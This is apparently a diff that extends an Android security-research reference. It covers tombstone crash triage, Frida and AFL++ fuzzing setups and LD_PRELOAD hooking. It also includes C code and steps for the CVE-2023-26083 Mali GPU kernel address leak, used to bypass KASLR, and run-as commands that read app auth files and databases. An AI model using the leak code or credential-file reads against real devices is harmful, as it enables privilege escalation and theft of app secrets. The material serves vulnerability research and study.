@@ -271,3 +271,270 @@ script.load()
 # Keep alive
 input("[*] Press Enter to exit...")
 ```
+
+## Tombstone Crash Analysis (Real Examples)
+
+### Reading Tombstone Files
+```bash
+# List tombstones (root required)
+adb shell su -c "ls -lt /data/tombstones/"
+
+# Pull specific tombstone
+adb shell su -c "cat /data/tombstones/tombstone_00"
+
+# Key fields to look for:
+# signal: SIGSEGV (11) = segfault, SIGABRT (6) = abort, SIGBUS (7) = bus error
+# code: SEGV_MAPERR = unmapped memory, SEGV_ACCERR = permission denied
+# fault addr: the address that caused the crash
+# registers: x0-x30, sp, pc values at crash time
+# backtrace: call stack showing where crash happened
+```
+
+### Example 1: Null Pointer Dereference (Not Exploitable)
+```
+signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x0000000000000000
+x0  0x0000000000000000  ← null pointer
+backtrace:
+  #0  __strlen_aarch64 (libc.so)
+  #1  Java_com_app_MainActivity_doThings+44 (libgetkey.so)
+```
+Root cause: JNI function returned null, passed to C++ string constructor → `strlen(nullptr)` → SIGSEGV. **DoS only.**
+
+### Example 2: Controlled Crash (EXPLOITABLE)
+```
+signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x4141414141414141
+x0  0x4141414141414141  ← attacker-controlled data ("AAAA...")
+backtrace:
+  #0  _JNIEnv::NewStringUTF+16 (libart.so)
+  #1  Java_com_app_MainActivity_nativeCrash2+56 (libbuggycrash.so)
+```
+Fault addr `0x4141414141414141` = buffer overflow with "A" pattern. **Attacker controls the pointer in x0.** This is exploitable for arbitrary code execution.
+
+### Triage Quick Check
+| Fault Address Pattern | Meaning | Severity |
+|---|---|---|
+| `0x0000000000000000` | Null pointer | Low (DoS) |
+| `0x4141414141414141` | Buffer overflow (ASCII "AAAA") | Critical (RCE) |
+| `0xdeadbeef` / similar | Sentinel/canary value | Medium |
+| Near valid heap range | Heap corruption | High |
+| Near stack range | Stack overflow | Critical |
+
+## CVE-2023-26083: Mali GPU Kernel Pointer Leak
+
+Leaks kernel addresses from userspace via Mali GPU driver timeline stream. Zero permissions needed (any app can open `/dev/mali0`).
+
+### Attack Flow
+```
+1. open("/dev/mali0")
+2. KBASE_IOCTL_VERSION_CHECK (handshake)
+3. KBASE_IOCTL_SET_FLAGS
+4. KBASE_IOCTL_TLSTREAM_ACQUIRE with BASE_TLSTREAM_ENABLE_CSF_TRACEPOINTS
+5. KBASE_IOCTL_GET_CONTEXT_ID
+6. KBASE_IOCTL_KCPU_QUEUE_CREATE
+7. Read stream → find KBASE_TL_KBASE_NEW_KCPUQUEUE (msg_id=59)
+8. Extract kcpu_queue kernel address from message at offset 24-12=12
+```
+
+### Key Code
+```c
+// Open Mali GPU device (no permissions needed!)
+int fd = open("/dev/mali0", O_RDWR);
+
+// Acquire timeline stream with CSF tracepoints enabled
+int streamfd = ioctl(fd, KBASE_IOCTL_TLSTREAM_ACQUIRE,
+    &(struct kbase_ioctl_tlstream_acquire){ .flags = BASE_TLSTREAM_ENABLE_CSF_TRACEPOINTS });
+
+// Read stream messages to find leaked kernel address
+char buf[0x1000];
+ssize_t rb = read(streamfd, buf, sizeof(buf));
+// Parse for msg_id == 59 (KBASE_TL_KBASE_NEW_KCPUQUEUE)
+// Kernel address of kcpu_queue at offset 12 in the message
+__u64 kcpu_queue_kaddr = *(__u64 *)(p + 12);
+```
+
+**Impact:** KASLR bypass - leaked kernel address enables calculation of kernel base for further exploitation.
+
+## JNI Analysis Tools
+
+### JNINinja.py (APK JNI Discovery)
+```bash
+# Comprehensive JNI analysis of an APK
+python3 JNINinja.py target.apk
+
+# Show only JNI bridge functions (exclude framework)
+python3 JNINinja.py -j -s target.apk
+
+# Filter by architecture
+python3 JNINinja.py --target-arch arm64 target.apk
+
+# Include checksec (binary protection analysis)
+python3 JNINinja.py --show-checksec target.apk
+```
+
+### RegisterNatives Frida Hook
+Apps that use `RegisterNatives` instead of standard `Java_*` naming hide their JNI bindings. Hook ART to reveal them:
+
+```javascript
+// Hook art::JNI::RegisterNatives to log all dynamic JNI registrations
+var symbols = Module.enumerateSymbolsSync("libart.so");
+for (var i = 0; i < symbols.length; i++) {
+    if (symbols[i].name.indexOf("art") >= 0 &&
+        symbols[i].name.indexOf("JNI") >= 0 &&
+        symbols[i].name.indexOf("RegisterNatives") >= 0 &&
+        symbols[i].name.indexOf("CheckJNI") < 0) {
+
+        Interceptor.attach(symbols[i].address, {
+            onEnter: function(args) {
+                var env = args[0];
+                var clazz = args[1];
+                var methods = args[2];
+                var nMethods = args[3].toInt32();
+
+                var className = Java.vm.tryGetEnv().getClassName(clazz);
+                console.log("[RegisterNatives] Class: " + className);
+
+                for (var j = 0; j < nMethods; j++) {
+                    var namePtr = methods.add(j * Process.pointerSize * 3).readPointer();
+                    var sigPtr = methods.add(j * Process.pointerSize * 3 + Process.pointerSize).readPointer();
+                    var fnPtr = methods.add(j * Process.pointerSize * 3 + Process.pointerSize * 2).readPointer();
+
+                    var methodName = namePtr.readUtf8String();
+                    var signature = sigPtr.readUtf8String();
+                    var module = Process.findModuleByAddress(fnPtr);
+
+                    console.log("  Method: " + methodName + " " + signature);
+                    console.log("  -> " + module.name + "!0x" + fnPtr.sub(module.base).toString(16));
+                }
+            }
+        });
+    }
+}
+```
+
+## AFL++ Frida Mode for Android
+
+Build and run AFL++ with Frida persistent mode on Android device.
+
+### afl.js Configuration (Persistent Mode)
+```javascript
+// Whitelist only target modules (exclude everything else)
+const module_whitelist = ["harness", "libtarget.so"];
+Afl.setInstrumentLibraries();  // Only instrument whitelisted libs
+
+// Persistent hook on fuzz_one_input function
+var fuzz_one_input = DebugSymbol.fromName("fuzz_one_input").address;
+Afl.setPersistentAddress(fuzz_one_input);
+Afl.setPersistentCount(10000);  // 10k iterations per fork
+Afl.setInMemoryFuzzing();       // No file I/O, buffer in memory
+
+// CModule for ARM64 persistent hook
+const cm = new CModule(`
+    extern void afl_persistent_hook(GumCpuContext *regs, uint8_t *input_buf,
+                                     uint32_t input_buf_len) {
+        regs->x[0] = (uint64_t)input_buf;   // Set arg0 = fuzz buffer
+        regs->x[1] = (uint64_t)input_buf_len; // Set arg1 = length
+    }
+`, { afl_persistent_hook: Afl.jsApiGetFunction("afl_persistent_hook") });
+
+Afl.setPersistentHook(cm.afl_persistent_hook);
+Afl.setMaxLen(4096);
+Afl.done();
+```
+
+### Run on Android Device
+```bash
+# Push AFL++ binaries and harness to device
+adb push afl-fuzz /data/local/tmp/
+adb push harness /data/local/tmp/
+adb push libtarget.so /data/local/tmp/
+
+# Create corpus directory
+adb shell mkdir -p /data/local/tmp/corpus
+echo "seed" | adb shell tee /data/local/tmp/corpus/seed
+
+# Run fuzzer
+adb shell "cd /data/local/tmp && AFL_FRIDA_PERSISTENT_HOOK=afl.js \
+    ./afl-fuzz -i corpus -o output -O -- ./harness"
+```
+
+## LD_PRELOAD Hooking on Android
+
+Inject shared library to intercept libc calls.
+
+### Hook Template
+```c
+// libhook.c - Compile with NDK
+#include <stdio.h>
+#include <dlfcn.h>
+
+typedef int (*orig_open_t)(const char *pathname, int flags);
+
+// Runs when library is loaded
+void __attribute__((constructor)) on_load() {
+    printf("[HOOK] Library loaded, PID: %d\n", getpid());
+}
+
+// Intercept open() syscall
+int open(const char *pathname, int flags, ...) {
+    printf("[HOOK] open(\"%s\")\n", pathname);
+    orig_open_t orig = (orig_open_t)dlsym(RTLD_NEXT, "open");
+    return orig(pathname, flags);
+}
+```
+
+```bash
+# Compile
+$NDK/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android30-clang \
+    -shared -fPIC -o libhook.so libhook.c -llog
+
+# Use on device (root)
+adb push libhook.so /data/local/tmp/
+adb shell su -c "LD_PRELOAD=/data/local/tmp/libhook.so /system/bin/app_process ..."
+```
+
+## Exploiting run-as (CVE-2024-0044)
+
+`run-as` allows accessing debuggable app sandboxes without root:
+```bash
+# If app has android:debuggable="true"
+adb shell run-as <package_name> ls files/
+adb shell run-as <package_name> cat shared_prefs/auth.xml
+adb shell run-as <package_name> cat databases/secret.db
+```
+
+CVE-2024-0044: Privilege escalation via `run-as` allowing access to non-debuggable app data on certain Android versions.
+
+## Boot Sequence & Partitions
+
+```bash
+# View partition table
+adb shell cat /proc/partitions
+
+# View partition name mapping
+adb shell ls -la /dev/block/platform/*/by-name/
+
+# Key partitions:
+# boot     - kernel + ramdisk
+# system   - Android framework (read-only, dm-verity protected)
+# vendor   - OEM-specific HAL + drivers (Treble)
+# data     - User data (encrypted with FBE)
+# recovery - Recovery mode OS
+# vbmeta   - Verified boot metadata
+```
+
+## Filesystem Monitoring (FSMon)
+
+```bash
+# Install NowSecure's fsmon
+adb push fsmon /data/local/tmp/fsmon
+adb shell chmod +x /data/local/tmp/fsmon
+
+# Monitor all file activity under /data
+adb shell su -c "/data/local/tmp/fsmon /data"
+
+# Monitor specific app's data directory
+adb shell su -c "/data/local/tmp/fsmon /data/data/<pkg>"
+
+# Useful for: finding where app stores secrets, what files it reads at startup,
+# what databases it writes to, detecting file-based IPC
+```
